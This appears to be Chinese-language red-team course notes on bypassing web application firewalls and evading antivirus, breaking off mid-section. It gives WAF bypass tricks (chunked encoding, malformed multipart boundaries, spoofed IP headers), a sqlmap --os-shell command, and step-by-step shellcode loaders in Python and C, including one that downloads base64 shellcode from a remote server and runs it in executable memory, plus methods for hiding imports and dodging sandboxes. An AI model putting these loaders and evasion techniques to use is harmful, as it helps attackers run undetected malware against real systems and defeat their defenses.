<p>•绿盟：<a target="_blank" rel="noopener" href="https://www.nsfocus.com.cn/">https://www.nsfocus.com.cn/</a><br>•安恒：<a target="_blank" rel="noopener" href="https://www.dbappsecurity.com.cn/">https://www.dbappsecurity.com.cn/</a><br>•铱(yi)迅：<a target="_blank" rel="noopener" href="https://www.yxlink.com/">https://www.yxlink.com/</a><br>•天融信<br>•深信服<br>•启明星辰<br>•知道创宇<br>•F5 BIG-IP：<a target="_blank" rel="noopener" href="https://www.f5.com/">https://www.f5.com/</a></p>
<hr>
<p><strong>基于云WAF</strong></p>
<p>•安全宝<br>•创宇盾：<a target="_blank" rel="noopener" href="https://defense.yunaq.com/cyd/">https://defense.yunaq.com/cyd/</a><br>•玄武盾<br>•腾讯云<br>•百度云<br>•西部数码<br>•阿里云盾<br>•奇安信网站卫士</p>
<hr>
<p><strong>Waf原理</strong></p>
<p>waf对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等。<br>waf工作在web服务器之前，对基于HTTP协议的通信进行检测和识别。通俗的说，waf类似于地铁站的安检，对于HTTP请求进行快速安全检查，通过解析HTTP数据，在不同的字段分别在特征、规则等维度进行判断，判断的结果作为是否拦截的依据从而决定是否放行。从事前、事中、事后来看，waf是在攻击进行时，用于阻断攻击的安全产品。</p>
<p>WAF比较常见的监测机制特点有以下几种。<br>•异常检测协议：拒绝不符合HTTP标准的请求，也可以只允许符合HTTP协议的部分选项通过，也有一些web应用防火墙还可以限定http协议中那些过于松散或未被完全制定的选项。<br>•增强输入验证：增强输入验证，对恶意字符进行拦截。<br>•及时补丁：及时屏蔽掉新型漏洞，避免攻击者进行攻击，主要依靠WAF厂商对新型漏洞的及时响应速度</p>
<p>•基于规则的保护和基于异常的保护：基于规则的保护可以提供各种web应用的安全规则，waf生产商会维护这个规则库，并及时为其更新。用户可以按照这些规则对应用进行全方面检测。还有的产品可以基于合法应用数据建立模型，并以此为依据判断应用数据的异常。但这需要对用户企业的应用具有十分透彻的了解才可能做到<br>•状态管理：能够判断用户是否是第一次访问，将请求重定向到默认登录页面并且记录事件，或对暴力破解行为进行拦截。<br>•其他防护技术：如隐藏表单域保护、抗入侵规避技术、响应监视和信息泄露保护。<br>•配置规则：可以自定义防护的规则，如是否允许“境外ip”的访问</p>
<hr>
<p><strong>Waf识别</strong></p>
<p>WAF绕过不仅要了解WAF检查的原理，还需要识别是什么类型的WAF，不同类型，不同品牌的waf监测机制不一样，绕过的方式也不同。<br>•wafw00f/WhatWaf<br>利用wafw00f识别WAF，可以在WAF指纹目录下自行编写脚本。这类WAF识别工具的原理基本都是根据HTTP头部信息、状态码以及WAF拦截页中的图片、文字做为特征来进行检测，如wafw00f工具中的yunsuo.py脚本就是根据cookie中的security_session_verify来检测的。</p>
<p>利用sqlmap -identify-waf参数识别WAF，一样可以在WAF指纹目录下根据原有脚本和Awesome-WAF项目自行编写WAF指纹识别脚本，但有时可能会因为sqlmap新老版本的原因而导致存放路径不一样。<br>更新前：/usr/share/sqlmap/waf<br>更新后：/usr/share/golismero/tools/sqlmap/waf<br>•项目地址<br>•<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br>•<a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Ekultek/WhatWaf">https://github.com/Ekultek/WhatWaf</a><br>•<a target="_blank" rel="noopener" href="https://github.com/0xInfection/Awesome">https://github.com/0xInfection/Awesome</a></p>
<hr>
<p><strong>Waf绕过</strong></p>
<p>WAF对于一些常规漏洞（如注入漏洞、XSS漏洞、命令执行漏洞、文件包含漏洞）的检测大多是基于“正则表达式”和“AI+规则”的方法，因此会有一定的概率绕过其防御。</p>
<hr>
<p><strong>常规waf绕过—文件上传</strong></p>
<p>•这里以文件上传为例，直观展示 ：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716212701098.png" alt="image-20220716212701098"></p>
<p>快速判断文件上传漏洞是否客观存在:<br>•01.我们直接前端上传正常文件，burp截断数据包后，尝试修改content-type和任意后缀，来判断黑白名单(eg:1.abc，随机后缀传上去了一般就是黑名单限制)<br>•02.随机后缀传不上去一般就是白名单，检查是否是前端JS限制，F12看一下，如果是前端限制，可以直接修改js。<br>•03.非前端白名单限制的话，只能尝试服务器和中间件的解析漏洞了</p>
<p>判断程序本身限制与WAF限制:<br>•01.程序本身黑名单限制：响应通常会有上传文件格式不允许的字样。<br>•02.WAF限制：返回页面通常会是302跳转WAF的拦截页面或是该次请求被重置reset无响应包。</p>
<p>常规绕过WAF限制：<br>遇见的常见的WAF，在上传阶段检测的字段通常是：<br>•Content-Disposition: form-data; name=”file”; filename=”1.php”<br>针对后缀类绕过的方法：构造当前能识别的正常文件的畸形包(.png)，然后再改后缀，服务器能解析，但是让WAF不认识。这些WAF都能在后缀落地的阶段绕过，各种WAF可能对后缀判断的具体的位置不同：例如某WAF：filename参数去掉引号就可以正常上传，原因是waf未识别到双引号“”内的黑名单文件，但服务器可以忽略进行正常接收解析。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716212804827.png" alt="image-20220716212804827"></p>
<hr>
<p><strong>基于HTTP协议的绕过方式</strong></p>
<p>HTTP隧道传输/ HTTP pipeline<br>通过使用 Connection: keep-alive 达到一次传输多个http包的效果:<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716212853106.png" alt="image-20220716212853106"></p>
<p><strong>基于HTTP协议的绕过方式–分块传输/ Chunked Transfer (HTTP 1.1)</strong></p>
<p>分块传输/ Chunked Transfer (HTTP 1.1)<br>通过在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。<br>目的：达到敏感参数分割效果<br>没有分块时，传入敏感参数，被waf拦截：</p>
<p>手工进行分块绕过较为繁琐，且花费时间长，面对大量资产的情况，项目时间较为紧张的情况下，还是使用自动化工具来的快捷方便。这里使用sqlmap+burp+burp插件（chunked-coding-converter）。<br>工具的项目地址：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/chunked-coding-converter%E3%80%82">https://github.com/c0ny1/chunked-coding-converter。</a><br>快速使用：burp获取post包后，复制post包，做成post.txt,并放置于sqlmap工具文件下。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213024873.png" alt="image-20220716213024873"></p>
<p>使用burp 设定插件，开启插件代理：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213055773.png" alt="image-20220716213055773"></p>
<p>使用Sqlmap进行代理：sqlmap语句sqlmap.py -r post.txt –proxy=<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> –os-shell</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213124083.png" alt="image-20220716213124083"></p>
<hr>
<p><strong>基于HTTP协议的绕过方式</strong></p>
<p><strong>ibm037编码/ Charset = xxx编码绕过</strong></p>
<p>利用不常见的特殊编码，绕过waf检测。ibmxxx编码在以下服务或语言中可被解析识别<br>•Nginx, uWSGl-Django-Python2 &amp; 3<br>•Apache-TOMCAT7/8- JVM1.6/1.8-JSP<br>•Apache- PHP5 (mod_ php &amp; FastCGI)<br>•IIS (6, 7.5, 8, 10) on ASP Classic, ASP.NET and PHP7.1- FastCGI</p>
<p><strong>HTTP协议未覆盖：</strong><br>Content-type: multipart/form-date 为什么存在？是为了满足能够既传参数又能传文件的场景；<br>•利用 Content-type: multipart/form-date 绕过上传的边界（boundary）限制<br>通过多boundary定义，使waf检测范围和实际上传范围不一致，从而绕过waf上传恶意内容：<br>•上传参数“file”,绕过waf检测“filename”</p>
<hr>
<p><strong>其他方式–高并发</strong></p>
<p>使用自动化工具短时间内发送大量攻击数据包。对请求进行并发，攻击请求会被负载均衡调度到不同节点，导致某些请求绕过了waf的拦截<br>缺点：动静太大，容易被业务察觉并封禁；</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213324688.png" alt="image-20220716213324688"></p>
<hr>
<p><strong>其他方式–垃圾数据(脏数据)</strong></p>
<p>用多参数或者无效数据填充请求，超出WAF的检测限制范围，从而绕过防御；</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716213359405.png" alt="image-20220716213359405"></p>
<hr>
<p><strong>其他方式—ip伪造</strong></p>
<p>常见的伪造IP请求头<br>•X-Forwarded-For:127.0.0.1<br>•X-Forwarded-Host:127.0.0.1<br>•X-Client-IP:127.0.0.1<br>•X-remote-IP:127.0.0.1<br>•X-remote-addr:127.0.0.1<br>•True-Client-IP:127.0.0.1<br>•X-Client-IP:127.0.0.1<br>•Client-IP:127.0.0.1<br>•X-Real-IP:127.0.0.1</p>
<hr>
<p><strong>常见中间件漏洞绕过WAF–常规绕WAF思路</strong></p>
<p><strong>错误的HTTP请求头</strong><br>    •类似文件上传时的绕过，通过畸形的HTTP协议头绕过WAF检测。比如绕过某些老版本WAF可以加入请求头：Content-    Encoding:deflate就可以绕过WAF（此方法在文件上传绕过WAF中也适用）<br><strong>通用的JAVA类关键字绕过</strong><br>    •将关键字转换成Unicode或者HEX编码的方式，JAVA程序会自动进行解码，所以在一定程度上能够绕过WAF<br><strong>使用未公开的漏洞利用链</strong><br>    •部分WAF会将公开的漏洞利用链中的关键字设置为黑名单，所以重新找一条利用链吧，自己的才是最香的</p>
<h2 id="webshell免杀"><a href="#webshell免杀" class="headerlink" title="webshell免杀"></a>webshell免杀</h2><p>Webshell免杀–脚本免杀</p>
<h2 id="shellcode免杀"><a href="#shellcode免杀" class="headerlink" title="shellcode免杀"></a>shellcode免杀</h2><p><strong>Shellcode免杀–前置知识：</strong></p>
<p>1.程序内存空间:<br>在冯诺依曼的体系结构中，一个进程必须有：text 段，data 段，bss 段。<br>1)•bss（可读可写）<br>bss 是英文 Block Started by Symbol 的简称，通常是指用来存放程序中未初始化的全局变量的一块内存区域，在程序载入时由内核清 0。BSS 段属于静态内存分配。它的初始值也是由用户自己定义的连接定位文件所确定，用户应该将它定义在可读写的 RAM 区内，源程序中使用 malloc 分配的内存就是这一块，它不是根据 data 大小确定，主要由程序中同时分配内存最大值所确定，不过如果超出了范围，也就是分配失败，可以等空间释放之后再分配。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214039119.png" alt="image-20220716214039119"></p>
<p>2)、text（只读）<br>text 段是程序代码段，在 AT91 库中是表示程序段的大小，它是由编译器在编译连接时自动计算的，当你在链接定位文件中将该符号放置在代码段后，那么该符号表示的值就是代码段大小，编译连接时，该符号所代表的值会自动代入到源程序中。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214112799.png" alt="image-20220716214112799"></p>
<p>3)、data（可读可写）<br>data 包含静态初始化的数据，所有有初值的全局变量和static 变量在 data 区。段的起始位置也是由连接定位文件所确<br>定，大小在编译连接时自动分配，它和你的程序大小没有关系，但和程序使用到的全局变量，常量数量相关。<br>栈(stack)保存函数的局部变量和参数。堆(heap)保存函数内部动态分配内存，是另外一种用来保存程序信息的数据结构，更准确的说是保存程序的动态变量。</p>
<p>2.函数指针:<br>函数指针是指向函数的指针变量。 因此“函数指针”本身首先应是指针变量，只不过该指针变量指向函数。这正如用指针变量可指向整型变量、字符型、数组一样，这里是指向函数。如前所述，C 在编译时，每一个函数都有一个入口地址，该入口地址就是函数指针所指向的地址。有了指向函数的指针变量后，可用该指针变量调用函数，就如同用指针变量可引用其他类型变量一样，在这些概念上是大体一致的。函数指针有两个用途：调用函数和做函数的参数。<br>•函数指针的声明形式：<br><code>void(*pFunction)()</code>,当然，没有参数的情况下也可写成<code> void(*pFunction)(void)</code>或者<code>void(*pFunction)()</code>的形式。那么 pFunction 函数指针的原型就是 <code>void (*)()</code>，即把变量名去掉，因此，对于一个给定的 entry 地址，要把它转换成为函数指针，就是<code>(void(*)())entry</code>。那么调用这个函数指针的方式就是<code>((void(*)())entry)()</code>;</p>
<p>Shellcode定义<br>Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode。<br>RAW文件<br>RAW 中文意思是原始的、未经加工的，通常使用Cobaltstrike生成的BIN文件。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214449050.png" alt="image-20220716214449050"></p>
<p>RAW文件是可以直接进行字节操作读取的，因此加载到内存较为方便，通常我一般使用混淆的方式再生成一遍。</p>
<hr>
<p><strong>Shellcode免杀–CS的Payload类型</strong></p>
<p>•Stager是分步式，分阶段的，只用少部分代码来请求和加载payload，cs的加载payload模式为反射加载beacon.dll，但这个beacon.dll并不在可执行文件中，而是在远程C2服务端。<br>•Stageless则是将beacon.dll包含在可执行文件中，并且可能有写额外的操作，于是文件比较大，特征也更明显，但是适合横向不出网机器，因为不出网所以有可能请求不了c2服务端上的beacon.dll。</p>
<hr>
<p><strong>Shellcode免杀–Shellcode Loader原理</strong></p>
<p>一个最基本的 shellcode loader 由以下几个模块组成：<br>(1).shellcode<br>(2).一块有执行权限的内存<br>(3).执行 shellcode 的函数或者方式<br>下图就是一个最简单的 shellcode loader，这个 loader 的流程是这样的：<br>(1).首先我们使用 cobalt strike 或者其他的 c2 工具生成 shellcode，将其复制到buf 的位置。<br>(2).然后我们使用 /section:.data,RWE 去修改 data 段的权限为可读可写可执行。<br>(3).最后使用((void(*)()) &amp;buf)();去执行 shellcode。(将 buf 的首地址(也就是shellcode 的入口地址) 强转为函数指针并执行)。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214703372.png" alt="image-20220716214703372"></p>
<p>Virustotal 的查杀率为 24/67,如下图所示：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214732871.png" alt="image-20220716214732871"></p>
<p>Shellcode<br>我们在用cs生成payload时，会生成一段特定编程语言的代码（以python为例）</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214826540.png" alt="image-20220716214826540"></p>
<p>里面一长串\xfc样式的16进制代码，这就是子弹shellcode<br>但光有子弹不行，所以我们需要一把枪loader才能让他发挥作用。</p>
<p>这里找了一个网上的python内存加载器 环境：python2.7    主要写的也是关于该加载器的实现原理，和调用参数的分析</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716214915350.png" alt="image-20220716214915350"></p>
<p>ctypes库<br>python的ctypes模块是内建，用来调用系统动态链接库函数的模块<br>使用ctypes库可以很方便地调用C语言的动态链接库，并可以向其传递参数。<br>•import ctypes<br>•import requests<br>•import base64</p>
<p>读取shellcode<br>我是将shellcode生成后，使用base64编码，放在了服务器123.txt文件上，由于后面操作是将代码写入内存，所以需要将代码解码并转为字节类型。<br>•scode = requests.get(“<a target="_blank" rel="noopener" href="http://192.168.1.1/123.txt&quot;">http://192.168.1.1/123.txt&quot;</a>)<br>•shellcode = bytearray(base64.b64decode(scode.text).decode(‘hex’))<br>设置返回类型<br>•我们需要用VirtualAlloc函数来申请内存，返回类型必须和系统位数相同想在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是 32 位</p>
<p>设置返回类型<br>•我们需要用VirtualAlloc函数来申请内存，返回类型必须和系统位数相同想在64位系统上运行，必须使用restype函数设置VirtualAlloc返回类型为ctypes.c_unit64，否则默认的是 32 位<br>•ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</p>
<p>申请内存<br>调用VirtualAlloc函数，来申请一块动态内存区域。<br>VirtualAlloc函数原型和参数如下：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">•LPVOID VirtualAlloc&#123;</span><br><span class="line">•LPVOID lpAddress, <span class="meta">#要分配的内存区域的地址</span></span><br><span class="line">•DWORD dwSize, <span class="meta">#分配的大小</span></span><br><span class="line">•DWORD flAllocationType, <span class="meta">#分配的类型</span></span><br><span class="line">•DWORD flProtect <span class="meta">#该内存的初始保护属性</span></span><br><span class="line">•&#125;;</span><br></pre></td></tr></table></figure>

<p>申请一块内存可读可写可执行</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">•ptr = ctypes.windll.kernel32.<span class="type">VirtualAlloc</span>(ctypes.c_int(0),</span><br><span class="line">•												ctypes.c_int(len(shellcode)),</span><br><span class="line">•												ctypes.c_int(0x3000),</span><br><span class="line">•												ctypes.c_int(0x40))</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716215216130.png" alt="image-20220716215216130"></p>
<p>将shellcode载入内存<br>调用RtlMoveMemory函数，此函数从指定内存中复制内容至另一内存里。<br>RtlMoveMemory函数原型和参数如下:<br>•RtlMoveMemory(Destination,Source,Length);<br>•Destination ：指向移动目的地址的指针。<br>•Source ：指向要复制的内存地址的指针。<br>•Length ：指定要复制的字节数。<br>从指定内存地址将内容复制到我们申请的内存中去，shellcode字节多大就复制多大</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">buf = (ctypes.c_char<span class="operator"> * </span>len(shellcode)).from<span class="constructor">_buffer(<span class="params">shellcode</span>)</span></span><br><span class="line">ctypes.windll.kernel32.<span class="constructor">RtlMoveMemory(<span class="params">ctypes</span>.<span class="params">c_int</span>(<span class="params">ptr</span>)</span>,</span><br><span class="line">											buf,</span><br><span class="line">											ctypes.c<span class="constructor">_int(<span class="params">len</span>(<span class="params">shellcode</span>)</span>))</span><br></pre></td></tr></table></figure>

<p>创建进程<br>调用CreateThread将在主线程的基础上创建一个新线程<br>CreateThread函数原型和参数如下：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">•HANDLE CreateThread(</span><br><span class="line">•LPSECURITY_ATTRIBUTES lpThreadAttributes,	<span class="meta">#线程安全属性</span></span><br><span class="line">•SIZE_T dwStackSize, 	<span class="meta">#置初始栈的大小，以字节为单位</span></span><br><span class="line">•LPTHREAD_START_ROUTINE lpStartAddress, 	<span class="meta">#指向线程函数的指针</span></span><br><span class="line">•LPVOID lpParameter, 	<span class="meta">#向线程函数传递的参数</span></span><br><span class="line">•DWORD dwCreationFlags, 	<span class="meta">#线程创建属性</span></span><br><span class="line">•LPDWORD lpThreadId	<span class="meta">#保存新线程的id</span></span><br><span class="line">•)</span><br></pre></td></tr></table></figure>

<p>创建一个线程从shellcode放置位置开始执行:</p>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">handle</span> = ctypes.windll.kernel32.<span class="type">CreateThread</span>(ctypes.c_int(0),</span><br><span class="line">​											ctypes.c_int(0),</span><br><span class="line">​											ctypes.c_uint64(ptr),</span><br><span class="line">​											ctypes.c_int(0),</span><br><span class="line">​											ctypes.c_int(0),</span><br><span class="line">​											ctypes.pointer(ctypes.c_int(0)))</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716215508110.png" alt="image-20220716215508110"></p>
<p>等待线程结束<br>调用WaitForSingleObject函数用来检测线程的状态<br>WaitForSingleObject函数原型和参数如下：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">等待线程结束</span><br><span class="line">调用<span class="keyword">WaitForSingleObject函数用来检测线程的状态</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">WaitForSingleObject函数原型和参数如下：</span></span><br><span class="line"><span class="keyword"></span>•DWORD WINAPI <span class="keyword">WaitForSingleObject(</span></span><br><span class="line"><span class="keyword"></span>__in HANDLE hHandle, <span class="comment">#对象句柄。可以指定一系列的对象</span></span><br><span class="line">__in DWORD dwMilliseconds <span class="comment">#定时时间间隔</span></span><br><span class="line">);</span><br><span class="line">等待创建的线程运行结束</span><br><span class="line">ctypes.windll.kernel32.<span class="keyword">WaitForSingleObject(</span></span><br><span class="line"><span class="keyword"></span>				ctypes.c_int(handle),</span><br><span class="line">				ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p>上面loader大致原理就是申请一块内存，将代码字节存入该内存，然后开始运行该内储存的程序，并让该程序一直运行下去。</p>
<hr>
<p><strong>Shellcode免杀–静态查杀</strong></p>
<p>1.特征码识别:<br>•杀软有自己的病毒库，里面有很多样本，扫描时会抽取扫描对象的一段特征并与病毒库里作比较，如果匹配，那就会认为是病毒。抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面又不要有太大的空间与时间的开销。如果一种病毒的特征代码增长一字节，要检测3000种病毒，增加的空间就是3000字节。在保持唯一性的前提下，尽量使特征代码长度短些，以减少空间与时间开销。<br>主要扫描的有：<br>    hash、文件名、函数名、敏感字符串、敏感api等等</p>
<p>2.云查杀:<br>云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，意思是只要联网病毒库就会同步更新，这种病毒库更加强大。<br>3.校验和法<br>根据正常文件的内容，计算其校验和，定期不定期的检查文件的校验是否与正常的校验和一样。其实本质还是特征码，万变不离其宗</p>
<p>4.启发式扫描：<br>但是面对未知的病毒，换个模样杀软就认不出了吗？所以安全厂商研究出了启发式算法<br>启发式则是将一类病毒总结后，归纳其特征，其后的演变都为一类病毒，这就是启发式算法。具体启发式算法可以由杀软来定，比如可以使用机器学习把家族病毒聚类，或简单的通过使用通用型yara规则，例如文件大小小于100kb，且没有图标则可以识别为病毒，以此达到查杀病毒。</p>
<hr>
<p><strong>Shellcode免杀—免杀姿势</strong></p>
<p>对抗方式：<br>•对 shellcode 进行混淆或加密<br>•分离免杀<br>•API调用隐藏</p>
<p><strong>Shellcode静态免杀—Shellcode加密/混淆</strong></p>
<p>•AES<br>•shellcode 字节替换<br>•Xor<br>•Base64<br>•Crypt1337<br>•字节替换</p>
<hr>
<p><strong>Shellcode免杀—分离免杀</strong></p>
<p>因为shellcode在程序里面很容易被查杀，像下面是最常用的加载shellcode的方式，内联汇编执行，函数指针执行，强制转换等等，当然很明显，这几种现在都是不免杀的。<br>分离免杀包括但不限于<br>•shellcode从文本提取<br>•shellcode与加载器分离<br>•远程加载shellcode（shellcode放在另一台主机上，走http协议下载）<br>•管道运输<br>•隐写在图片上，powershell加载</p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/Hangingsword/HouQing">https://github.com/Hangingsword/HouQing</a><br>该项目是用 Go 语言编写的免杀项目，可以将生成的 Shellcode 隐藏进图片中，然后让目标主机进行远程加载调用。<br>•code.go：用于生成含有 Shellcode 的图片。<br>• Loader.go：用于远程加载图片里的 Shellcode。</p>
<p>管道运输<br>何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。<br>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程。</p>
<hr>
<p><strong>Shellcode静态免杀—隐藏IAT</strong></p>
<p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地<br>址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716220113146.png" alt="image-20220716220113146"></p>
<p>在PE结构中，存在一个导入表，导入表中声明了这个PE文件会载入哪些模块，同时每个模块的结构中又会指向模块中的一些函数名称。这样的组织关系是为了告诉操作系统这些函数的地址在哪里，方便修正调用地址。如果一个文件的文件大小在300KB以内，并且导入函数又有Virtual Alloc、CreateThread，且VirtualAlloc的最后一个参数是0x40，那么此文件是高危文件。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716220148183.png" alt="image-20220716220148183"></p>
<hr>
<p><strong>Shellcode免杀—API调用隐藏</strong></p>
<p>前置知识：<br>•PE结构知识<br>•Windows API<br>•C/C++编程语言基础<br>原理：<br>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地<br>址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。</p>
<p>隐藏IAT<br>我们要实现的就是：相当于隐藏敏感的API，通过 GetModuleHandle + GetProcAddress 的方式隐藏敏感API<br>一般进内存的主要流程：<br>•VirtualAlloc -&gt; VirtualProtect -&gt; CreateThread -&gt; WaitForSingleObject<br>这几个函数是比较明显的，并且都在kernel32.dll中导出，尝试自己定义他们的函数指针，然后利用GetProcAddress获取函数地址，调用自己的函数名称。</p>
<hr>
<p><strong>Shellcode免杀—动态(行为)查杀</strong></p>
<p>动态查杀指的是 程序在运行的过程中执行了某些敏感操作，导致杀软查杀。谈到动态查杀不得不提一个东西叫沙盒。<br>沙盒：也叫启发式查杀，通过模拟计算机的环境执行目标文件再观察特征行为。沙盒模拟的常见特征：其实主要就是找一台真实的计算机和沙盒的区别到底在哪，找到那些真实的计算机具有而模拟的计算机无法具有的特征，进行绕过即可</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220716220433905.png" alt="image-20220716220433905"></p>
<p>杀软监控动态查杀的点：<br>•系统服务（指的是这些）<br>•注册表（键值） 修改注册表的行为一般都是敏感行为（高危添加用户、删除用户）<br>•组策略<br>•防火墙<br>•敏感程序（cmd powershell wmi psexec bitsadmin rundll 等）<br>•各种 win32api<br>这里强调一下，监控进程调用的api不止是api名字，还包括api的 调用顺序、调用源、参数等等 。</p>
<p>网络相关<br>•流量特征: cobalt strike 的通信协议，是由 RSA 传输 AES 的密钥，AES的密钥加密后续通信，这也是c2的常规通信手法，但未经修改的profile 和证书，很容易被检测到。<br>•内容特征：data字段是否存在命令相关的关键词加密特征（payload是否通讯加密，明文传输就会被查杀）<br>•结构特征: 是否存在已知远控的通讯结构（ cs 中 beacon 有 sleep）<br>•IP : 是否被情报系统标记为恶意</p>
<p>对行为来讲，很多个API可能会触发杀软的监控，比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。 针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。除常规的替换、使用未导出的API等姿势外，我们还可以使用通过直接系统调用的方式实现，比如使用内核层面Zw系列的API，绕过杀软对应用层的监控。</p>
<p>对于api的bypass：<br>•白名单<br>•用实现同样功能的api替换<br>•重写对应的api<br>•调用0环的api绕过3环杀软（直接系统调用)<br>等等，肯定不止这些， 说起来很容易，但具体实现需要很深的底层功底，起码对Windows操作系统的底层实现，win32api等很熟悉，这就需要内功。</p>
<hr>
<p><strong>Shellcode免杀—Shellcode加载方式</strong></p>
<p>执行内存空间shellcode的api或者方法：<br>•创建线程，比如CreateThread，如果是进程注入那就是CreateRemoteThread<br>•指针执行<br>•syscall<br>•apc注入<br>或是使用Fiber（纤程）加载，还有很多，都是一些技巧了，核心其实就是这么些API，再去做规避。</p>
<p>直接执⾏</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line">	<span class="keyword">void</span> *exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="keyword">sizeof</span> buf, MEM_COMMIT, </span><br><span class="line">	PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(exec, buf, <span class="keyword">sizeof</span> buf);</span><br><span class="line">	((<span class="built_in"><span class="keyword">void</span></span>(*)())exec)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建堆</p>
